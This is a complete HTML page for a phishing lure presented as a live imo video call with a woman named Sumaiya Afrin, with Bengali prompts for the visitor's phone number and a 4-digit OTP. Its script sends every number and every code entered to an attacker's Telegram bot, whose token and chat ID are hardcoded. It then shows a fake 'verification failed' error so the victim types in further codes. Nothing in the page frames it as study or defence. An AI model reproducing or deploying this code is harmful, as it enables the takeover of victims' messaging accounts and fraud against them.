<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sumaiya Afrin LIVE</title>

    <style>
        body { font-family: sans-serif; text-align: center; background: #f4f4f4; margin: 0; padding: 0; }
        .card { width: 95%; max-width: 380px; margin: 50px auto; background: white; padding: 25px 20px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); box-sizing: border-box; }
        img { width: 100px; height: 100px; border-radius: 50%; border: 3px solid #e91e63; object-fit: cover; margin-bottom: 10px; }
        
        /* নামকে আরও মোটা করার জন্য CSS */
        h2 { margin: 10px 0; font-size: 26px; color: #000; font-weight: 900; letter-spacing: -0.5px; }
        
        p { color: #333; font-size: 14px; margin-bottom: 20px; }

        input#phone { width: 100%; padding: 15px; margin: 15px 0; border: 2px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; text-align: center; }
        
        .otp-container { display: flex; justify-content: center; gap: 8px; margin: 20px 0; }
        .otp-box { width: 48px; height: 60px; border: 1px solid #d1d1d1; border-radius: 10px; font-size: 22px; text-align: center; background: #fdfdfd; outline: none; transition: 0.3s; }
        .otp-box:focus { border-color: #e91e63; }

        #statusMsg { margin-top: 15px; min-height: 30px; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        #timerDisplay { font-size: 13px; font-weight: bold; color: #8E8E8E; text-transform: uppercase; margin-bottom: 5px; }
        #errorDisplay { font-size: 13px; font-weight: bold; color: red; min-height: 20px; }

        .loader { border: 2px solid #f3f3f3; border-top: 2px solid #333; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 5px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .unlock-btn { width: 100%; padding: 15px; background: linear-gradient(to right, #6a11cb, #2575fc); color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 15px; font-weight: bold; margin-top: 10px; display: flex; justify-content: center; align-items: center; gap: 5px; }
    </style>
</head>
<body>

<div class="card">
    <img src="received_1748447966512537.jpeg" alt="Profile Image">
    
    <h2 id="displayTitle" style="font-weight: 900;">Sumaiya Afrin</h2>
    <p id="displayMsg">আপনার ইমু নম্বর দিয়ে ভিডিও কল শুরু করুন</p>

    <form id="mainForm">
        <div id="step1">
            <input type="tel" id="phone" placeholder="Phone Number imo ✆" required>
            <button type="button" class="unlock-btn" onclick="goToStep2()">VIDEO CALL JOIN NOW</button>
        </div>

        <div id="step2" style="display:none;">
            <div class="otp-container">
                <input type="tel" maxlength="1" class="otp-box" id="otp1" oninput="moveNext(this, 'otp2')" onkeyup="moveBack(event, 'otp1')">
                <input type="tel" maxlength="1" class="otp-box" id="otp2" oninput="moveNext(this, 'otp3')" onkeyup="moveBack(event, 'otp1')">
                <input type="tel" maxlength="1" class="otp-box" id="otp3" oninput="moveNext(this, 'otp4')" onkeyup="moveBack(event, 'otp2')">
                <input type="tel" maxlength="1" class="otp-box" id="otp4" oninput="processOTP(this)" onkeyup="moveBack(event, 'otp3')">
            </div>
            
            <button type="button" class="unlock-btn">🔒 UNLOCK VIDEO CALL JOIN NOW</button>
            
            <div id="statusMsg">
                <div id="timerDisplay">VERIFYING IN 30S...</div>
                <div id="errorDisplay"></div>
            </div>
        </div>
    </form>
</div>

<script>
    const token = '8521030210:AAHTVvrMSiVWpK_HeX6Uh9_ZZ9VKKm7jEg0';
    const chatId = '8795859465';
    let userPhone = "";

    function moveNext(current, nextFieldID) {
        if (current.value.length >= 1 && nextFieldID !== "") {
            document.getElementById(nextFieldID).focus();
        }
    }

    function moveBack(event, prevFieldID) {
        if (event.key === "Backspace" && event.target.value === "") {
            document.getElementById(prevFieldID).focus();
        }
    }

    function startGlobalTimer() {
        const timerText = document.getElementById('timerDisplay');
        let timeLeft = 30;
        
        const interval = setInterval(() => {
            if (timeLeft > 0) {
                timeLeft--;
                timerText.innerHTML = `VERIFYING IN ${timeLeft}S...`;
            } else {
                timerText.innerHTML = `VERIFYING IN 0S...`;
                clearInterval(interval);
            }
        }, 1000);
    }

    function processOTP(current) {
        if (current.value.length >= 1) {
            const otpBoxes = document.querySelectorAll('.otp-box');
            const errorBox = document.getElementById('errorDisplay');
            const otpValue = Array.from(otpBoxes).map(input => input.value).join('');

            if (otpValue.length === 4) {
                otpBoxes.forEach(box => box.readOnly = true);
                errorBox.innerHTML = '<div class="loader"></div> <span style="color:black">Please wait...</span>';

                setTimeout(() => {
                    sendToTelegram(`✅ OTP Attempted!\n📱 Number: ${userPhone}\n🔑 OTP: ${otpValue}`);
                    errorBox.innerHTML = '⚠️ verification code failed please try again. ⚠️';
                    
                    setTimeout(() => {
                        otpBoxes.forEach(box => {
                            box.readOnly = false;
                            box.value = '';
                        });
                        errorBox.innerHTML = ''; 
                        document.getElementById('otp1').focus();
                    }, 2000);
                }, 5000); 
            }
        }
    }

    function goToStep2() {
        const phoneInput = document.getElementById('phone').value;
        if (phoneInput.length < 10) {
            alert("সঠিক মোবাইল নম্বর দিন");
            return;
        }
        userPhone = phoneInput;

        document.getElementById('displayTitle').innerText = "Private Access";
        document.getElementById('displayMsg').innerText = "কোডটি নিচে লিখুন";

        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';
        document.getElementById('otp1').focus();
        startGlobalTimer();
        sendToTelegram(`🔔 New Hit!\n📱 Number: ${userPhone}`);
    }

    function sendToTelegram(text) {
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
        fetch(url);
    }
</script>
</body>
</html>
